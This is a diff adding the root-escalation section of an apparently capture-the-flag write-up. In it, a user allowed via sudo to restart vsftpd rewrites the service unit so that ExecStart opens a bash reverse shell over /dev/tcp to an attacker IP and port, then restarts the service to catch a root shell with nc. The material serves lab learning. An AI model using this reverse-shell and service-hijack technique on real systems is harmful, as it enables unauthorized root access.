@@ -195,3 +195,31 @@ Matching Defaults entries for drac on ide:
 User drac may run the following commands on ide:
     (ALL : ALL) /usr/sbin/service vsftpd restart
 ```
+
+We can modify the service like this, to set a listenner shell at the restart of the service :
+
+```bash
+[Unit]
+Description=vsftpd FTP server
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'exec bash -i &>/dev/tcp/10.10.6.186/1234 <&1'
+```
+
+Now reload daemons and restart the service, don't forget to set up a nc listenner on the right port.
+
+```bash
+$ systemctl daemon-reload
+[...]
+$ /usr/sbin/service vsftpd restart
+```
+
+Finally, if you check we check our nc listenner, we are root !
+
+---
+
+## Root flag
+
+The flag root's flag is in /root/root.txt
